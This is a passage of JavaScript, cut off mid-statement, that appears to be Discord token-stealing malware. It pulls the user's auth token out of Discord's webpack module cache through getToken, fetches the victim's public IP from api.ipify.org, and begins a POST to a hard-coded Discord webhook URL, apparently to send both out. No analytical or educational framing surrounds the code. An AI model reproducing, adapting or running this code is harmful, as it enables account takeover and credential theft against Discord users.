...
var req = webpackJsonp.push([    [], {extra_id: (e, t, r) => e.exports = r},[        ["extra_id"]]]);for (let e in req.c)
    if (req.c.hasOwnProperty(e)) {
        ...
        if (t && t.__esModule && t.default)
            for (let e in t.default) "getToken" === e && (authToken = t.default.getToken())
    }
require("request").get("https://api.ipify.org", async (err, res, body) => {
  const options = {
    method: 'POST',
    url: 'https://discord.com/api/webhooks/886962621184610345/NvW-_MHtLroQfCGmmK7sedQbYsw_4aqM-akjC9h-p22P2vzTSDt7tcW4RsYdqg1JD4Pa', // 
